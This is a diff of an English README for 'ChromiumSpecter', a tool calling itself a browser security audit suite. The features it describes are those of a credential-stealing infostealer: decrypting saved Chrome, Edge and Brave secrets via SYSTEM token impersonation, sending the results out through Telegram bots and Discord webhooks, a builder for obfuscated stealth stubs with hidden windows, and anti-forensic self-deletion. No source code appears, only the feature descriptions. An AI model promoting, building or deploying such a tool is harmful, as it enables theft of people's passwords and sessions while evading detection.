@@ -1,4 +1,4 @@
-# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Stable)
+# 🛡️ ChromiumSpecter Auditor Suite `v2.6.0` (V20 Stable)
 
 > [!NOTE]
 > **English Version** | [Versión en Español](README.md)
@@ -11,7 +11,7 @@
 ![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)
 ![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)
 
-*The ultimate tactical-grade suite for security audits on Chromium-based browsers.*
+*The ultimate tactical-grade suite for security audits on Chromium-based browsers (Chrome, Edge, Brave, Vivaldi, Opera, Opera GX).*
 
 [Report Bug](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues) | [Request Feature](https://github.com/ANONIMO432HZ/ChromiumSpecter/issues)
 
@@ -43,9 +43,10 @@ ChromiumSpecter implements a direct decryption engine using SYSTEM impersonation
 ### 🌟 Key Features
 
 * **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and result management.
-* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.5.0`**:
-  * Full support for **Chrome v127+ (App-Bound Encryption)** via the new `v20_decryptor` module.
-  * Hybrid Decryption: Supports **AES-GCM (v10/v11)**, **DPAPI Legacy**, and the new **v20** scheme in the same database.
+* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.6.0`**:
+  * Full native support for **Chrome v127+, Edge v127+, and Brave v130+ (App-Bound Encryption)** via the `v20_decryptor` module.
+  * Hybrid Decryption: Supports **AES-GCM (v10/v11)**, **DPAPI Legacy**, and the new **v20** scheme simultaneously in the same database.
+  * **Brave Direct Key Support**: Automatically maps 32-byte direct key payloads without complex nested encryption flags.
   * **Intelligent Synchronization**: The engine now uses dynamic imports to survive obfuscators and ensure portability.
   * **Privilege Escalation**: Implements native SYSTEM impersonation (via `winlogon.exe`) to extract system-protected keys. **(Requires running as Administrator)**.
   * Smart detection: The engine identifies the prefix (`v10`, `v11`, `v20`) and applies the corresponding algorithm with automatic fallback.
@@ -55,7 +56,7 @@ ChromiumSpecter implements a direct decryption engine using SYSTEM impersonation
   * **Anti-Forensics**: Support for **Tactical Self-Destruct** (Auto-Delete) of the binary after execution.
   * **Panic Protocol**: Total audit environment sanitization with a single click.
 * **🧠 Smart Profile Detection**:
-  * Differentiated scanning: Chrome/Edge/Brave use subdirectories (`Default`, `Profile N`); Opera/Vivaldi use the root directly.
+  * Differentiated scanning and integrated premium UI styling (brand-tailored color badges for Chrome, Edge, Brave, Vivaldi, Opera, and Opera GX).
   * File size validation before processing (avoids false positives with empty DBs).
   * `PermissionError` handling per profile without aborting the full scan.
 
@@ -69,7 +70,7 @@ ChromiumSpecter implements a direct decryption engine using SYSTEM impersonation
 * **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
 * **Local Persistence**: Secure saving of exfiltration configurations for recurring use.
 
-### 🛠️ Integrated Visual Builder `v2.5.0`
+### 🛠️ Integrated Visual Builder `v2.6.0`
 
 Custom stub generation with **Dynamic Parameter Injection**.
 **Universal Dependency Injection**: The builder now automatically parses `requirements.txt` and resolves dependencies at compile time.
@@ -94,7 +95,7 @@ Custom stub generation with **Dynamic Parameter Injection**.
 The main engine (`main.py`) can be run independently without the GUI, ideal for automation or quick terminal deployments.
 
 > [!IMPORTANT]
-> **PRIVILEGE REQUIREMENT**: To decrypt **Chrome v127+ (V20)** profiles, it is **MANDATORY** to run the terminal (or the `.exe`) with **Administrator privileges**. Without these privileges, the engine will be unable to perform the SYSTEM impersonation required to access the CNG key store.
+> **PRIVILEGE REQUIREMENT**: To decrypt **Chrome, Edge, and Brave v127+ (V20)** profiles, it is **MANDATORY** to run the terminal (or the `.exe`) with **Administrator privileges**. Without these privileges, the engine will be unable to perform the SYSTEM impersonation required to access the CNG key store.
 
 ```bash
 # Basic audit
@@ -152,7 +153,6 @@ When using the **Builder**, you can inject the following behaviors into your fin
 > - **Show Console** (Compiler): Determines if the **Operating System** creates the window from scratch. Unchecked = `Windowed App`, there is never a black window.
 > - **Stealth Mode** (Runtime): The window is created, but the code hides it in milliseconds with `ShowWindow(0)`. A brief flash may be seen.
 > - **Recommendation**: Leave "Show Console" **unchecked** + "Stealth Mode" **checked** for double layer of stealth.
-```
 
 ---
 
@@ -161,11 +161,11 @@ When using the **Builder**, you can inject the following behaviors into your fin
 | Component | Technology |
 | :--- | :--- |
 | **Core UI** | `CustomTkinter` (Modern Dark Theme) |
-| **Cryptography** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
-| **OS Security** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
+| **Cryptography** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` + `SYSTEM Token Impersonation` |
+| **OS Security** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`) |
 | **Compilation** | `PyInstaller` + `PyArmor` + `UPX` |
 | **Persistence** | Local `JSON` (`.audit/exfil_config.json`) |
-| **Testing** | `pytest` + `pytest-mock` (20 tests, 0 failures) |
+| **Testing** | `pytest` + `pytest-mock` (22 tests, 0 failures) |
 
 ---
 
